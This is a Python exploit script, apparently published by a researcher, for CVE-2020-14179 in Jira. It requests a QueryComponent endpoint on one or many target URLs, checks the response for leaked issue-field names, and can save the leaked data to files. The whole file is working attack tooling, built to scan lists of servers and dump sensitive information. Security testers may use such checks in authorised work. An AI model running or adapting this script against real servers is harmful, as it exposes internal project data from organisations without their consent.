import os
import requests
import argparse
from typing import Dict, Optional, Union
from urllib.parse import urlparse

class Exploit:
    """
    A class to create and send HTTP requests to a target URL.

    Attributes:
        target_url (str): The URL to which the request will be sent.
        request_headers (Optional[Dict[str, str]]): The headers to include in the request.
        request_data (Optional[Union[Dict[str, Union[str, int]], str]]): The data to include in the request.
        request_type (Optional[str]): The type of HTTP request (e.g., 'GET', 'POST').
    """
    
    def __init__(self, url: str, headers: Optional[Dict[str, str]] = None, data: Optional[Union[Dict[str, Union[str, int]], str]] = None, req_type: Optional[str] = None) -> None:
        """
        Constructs the necessary attributes for the Exploit object.

        Args:
            url (str): The target URL.
            headers (Optional[Dict[str, str]]): The request headers. Defaults to None.
            data (Optional[Union[Dict[str, Union[str, int]], str]]): The request data. Defaults to None.
            req_type (Optional[str]): The type of HTTP request. Defaults to None.
        """
        self.target_url = url
        self.request_headers = headers
        self.request_data = data
        self.request_type = req_type
    
    def send_request(self) -> str:
        """
        Sends an HTTP request to the target URL based on the specified request type.

        Returns:
            str: The response text or an error message if the request fails.
        """
        if self.request_type is None:
            return "Request type not specified"
        
        try:
            print(f"[+] Setting request type to {self.request_type.upper()}")
            match self.request_type.upper():
                case 'POST':
                    response = requests.post(self.target_url, headers=self.request_headers, data=self.request_data)
                case 'GET':
                    response = requests.get(self.target_url, headers=self.request_headers, params=self.request_data)
                case 'PUT':
                    response = requests.put(self.target_url, headers=self.request_headers, data=self.request_data)
                case 'DELETE':
                    response = requests.delete(self.target_url, headers=self.request_headers, data=self.request_data)
                case _:
                    return "Unsupported request type"
            
            response.raise_for_status()
            return response.text
        except requests.exceptions.HTTPError as e:
            return f"HTTP error occurred: {e}"
        except requests.exceptions.ConnectionError:
            return "Failed to connect to the server. The domain might be down or doesn't exist."
        except requests.exceptions.Timeout:
            return "The request timed out."
        except requests.exceptions.RequestException as e:
            return f"An error occurred: {e}"

def check_searchers(response: str) -> str:
    """
    Checks if the specified searchers are present in the response.

    Args:
        response (str): The response text to check.

    Returns:
        str: '[+] Exploit worked, target is vulnerable!' if the searchers are present, otherwise '[-] Exploit didn't work, target isn't vulnerable!'.
    """
    searchers = [
        "issue.field.project",
        "issue.field.summary",
        "issue.field.issuetype",
        "issue.field.status",
        "issue.field.priority",
        "issue.field.resolution",
        "issue.field.creator",
        "issue.field.affectsversions",
        "issue.field.fixversions",
        "issue.field.component"
    ]
    
    for searcher in searchers:
        if searcher in response:
            return "[+] \033[4mExploit worked, target is vulnerable!\033[0m"
    return "[-] \033[4mExploit didn't work, target isn't vulnerable!\033[0m"

def clear_screen() -> None:
    """
    Clears the terminal screen based on the operating system.
    """
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def print_banner() -> None:
    """
    Prints the banner with information about the script.
    """
    banner = """
#############################################
#                                           #
#          Exploit Script Utility           #
#                                           #
#############################################
#                                           #
#    Author: oromos    Date: 24.05.2024     #
#                                           #
# This script sends an HTTP/S request to a  #
# specified URL and checks if the target is #
# really vulnerable to the CVE-2020-14179.  #
#                                           #
# Impact:                                   #
# Sensitive information Disclosure.         #
#                                           #
# Usage:                                    #
# python3 main.py --url <target_url>        #
# python3 main.py --list <file.txt>         #
#                                           #
#############################################
    """
    print(banner)

def save_response(domain: str, response: str) -> None:
    """
    Saves the response text to a file named <domain>.dumped.

    Args:
        domain (str): The domain of the target URL.
        response (str): The response text to save.
    """
    filename = f"{domain}.dumped"
    with open(filename, 'w') as file:
        file.write(response)
    print(f"[+] Response saved to {filename}")

def process_url(url: str, dump: bool) -> None:
    """
    Processes a single URL to demonstrate the usage of the Exploit class and check for searchers in the response.

    Args:
        url (str): The target URL.
        dump (bool): Flag to indicate if the response should be saved.
    """
    print("[+] Checking the structure of the URL...")
    exploit_url = url + "/secure/QueryComponent!Default.jspa"
    print(f"[+] Sending request to: {exploit_url}")
    
    exploit = Exploit(url=exploit_url, req_type='GET')
    response = exploit.send_request()

    if dump:
        print("[+] Attempting to see if the target is vulnerable...")
        domain = urlparse(url).netloc
        save_response(domain, response)
        if "Request failed" in response or "HTTP error occurred" in response or "Failed to connect" in response or "The request timed out" in response:
            print(response)
        else:
            print(check_searchers(response))
    else:
        print("[+] Attempting to see if the target is vulnerable...")
        if "Request failed" in response or "HTTP error occurred" in response or "Failed to connect" in response or "The request timed out" in response:
            print(response)
        else:
            print(check_searchers(response))

def main(url: Optional[str], file_path: Optional[str], dump: bool) -> None:
    """
    Main function to process URLs and check for vulnerabilities.

    Args:
        url (Optional[str]): The target URL.
        file_path (Optional[str]): The path to the file containing URLs.
        dump (bool): Flag to indicate if the response should be saved.
    """
    clear_screen()
    print_banner()

    if url:
        process_url(url, dump)
    elif file_path:
        with open(file_path, 'r') as file:
            urls = file.readlines()
            for url in urls:
                url = url.strip()
                if url:
                    process_url(url, dump)
    else:
        print("Specify either --url or --list.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send a request to the specified URL and check for searchers.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--url', type=str, help='The URL to send the request to.')
    group.add_argument('--list', type=str, help='The file containing a list of URLs to send the requests to.')
    parser.add_argument('--dump', action='store_true', help='Save the response data(json).')

    args = parser.parse_args()
    main(args.url, args.list, args.dump)
